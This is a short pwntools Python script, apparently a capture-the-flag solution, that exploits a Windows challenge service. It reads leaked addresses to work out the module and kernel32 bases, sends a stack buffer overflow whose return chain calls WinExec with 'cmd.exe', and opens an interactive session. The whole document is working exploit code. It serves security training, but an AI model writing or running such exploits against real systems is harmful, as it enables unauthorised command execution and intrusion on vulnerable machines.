from pwn import *

#r = remote('192.168.189.133',12345)
r = remote('chall.angelboy.tw',56002)
r.newline = b'\r\n'

r.recvuntil(b'Main:')
main1 = r.recvline().strip()
main = int(main1,16)
print(hex(main))

base = main - 0x1110
iat_base = base + 0x2000
GetCurrentThreadId_iat = iat_base + 0x10

r.send(b'cmd.exe')
print(p64(GetCurrentThreadId_iat))
r.send(hex(GetCurrentThreadId_iat))
r.recvuntil(b'address : ')
kernel32_dll =  int(r.recvline().strip(),16) - 0x15e80
print(hex(kernel32_dll))
#r.send(b'123')

winexec = kernel32_dll + 0x1280
r.send(b'a' * 256 + b'b' * 8 + p64(base + 0x123a) + p64(winexec))


r.interactive()
